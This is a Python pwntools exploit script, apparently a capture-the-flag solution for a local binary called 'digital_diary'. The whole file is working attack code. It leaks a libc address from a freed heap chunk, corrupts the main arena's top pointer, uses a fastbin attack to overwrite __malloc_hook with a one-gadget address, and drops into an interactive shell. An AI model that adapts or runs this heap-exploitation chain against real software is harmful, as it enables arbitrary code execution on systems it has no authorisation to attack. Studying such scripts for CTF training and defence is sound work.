from pwn import *

def create_secret():
	r.sendlineafter('exit\n', '1')
	return

def use_secret():
	r.sendlineafter('exit\n', '2')
	return

def rm_secret():
	r.sendlineafter('exit\n', '3')
	return

def save(idx, size, data):
	r.sendlineafter('exit\n', '4')
	r.sendlineafter('index: \n', str(idx))
	r.sendlineafter('size: \n', str(size))
	r.sendafter('memory: \n', data)
	return

def view(idx):
	r.sendlineafter('exit\n', '5')
	r.sendlineafter('index: \n', str(idx))
	return

def erase(idx):
	r.sendlineafter('exit\n', '6')
	r.sendlineafter('index: \n', str(idx))
	return

def leak(idx, ru):
	view(idx)
	r.recvuntil(ru)
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	create_secret()
	# chunk to use in order to overlap the victim chunk
	save(0, 0x80, p64(0xb00bface)*13 + p64(0x1fa51))
	save(1, 0x68, 'B'*8)
	# wall chunk to prevent consolidation with the top chunk
	save(2, 0x68, 'C'*8)

	erase(0)

	save(0, 0x80, 'A'*8)

	libc = leak(0, 'A'*8) - 0x3c4b78
	__malloc_hook = libc + 0x3c4b10
	oneshot = libc + 0xf1147
	log.success('Libc: 0x{:x}'.format(libc))

	rm_secret()

	# place at (QWORD*)secret + 1 the address of the main arena
	# which contains the address of the top chunk. however,
	# we place it misaligned ((char*)addr + 1) in order to fool _int_malloc
	# into thinking that it's 0x100 before that after calling use_secret()
	save(3, 0x18, p64(0xb00bface) + p64(libc + 0x3c4b79))

	# now av->top points before chunk #1 -- we can leverage that into fastbin attack
	use_secret()
	
	erase(1)

	save(4, 0x100, p64(0x1337)*0x3 + p64(0x71) + p64(__malloc_hook - 0x23))
	save(5, 0x68, 'kek')
	save(6, 0x68, 'A'*0x13 + p64(oneshot))

	r.sendlineafter('exit\n', '4')
	r.sendlineafter('index: \n', '7')
	r.sendlineafter('size: \n', '43')

	r.interactive()

if __name__ == "__main__":
	r = process('./digital_diary')
	pause()
	pwn()
